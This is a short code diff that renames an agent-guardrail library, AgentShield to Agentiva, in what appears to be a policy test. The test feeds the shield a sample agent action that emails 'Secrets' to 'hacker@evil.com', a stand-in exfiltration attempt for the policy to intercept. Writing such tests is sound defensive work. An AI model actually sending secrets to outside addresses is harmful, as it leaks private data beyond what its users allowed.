@@ -1,10 +1,10 @@
 import asyncio
 
-from agentshield import AgentShield
+from agentiva import Agentiva
 
 
 async def _run_policy_test() -> None:
-    shield = AgentShield(mode="shadow", policy_path="policies/default.yaml")
+    shield = Agentiva(mode="shadow", policy_path="policies/default.yaml")
 
     a1 = await shield.intercept(
         "send_email", {"to": "hacker@evil.com", "subject": "Secrets"}
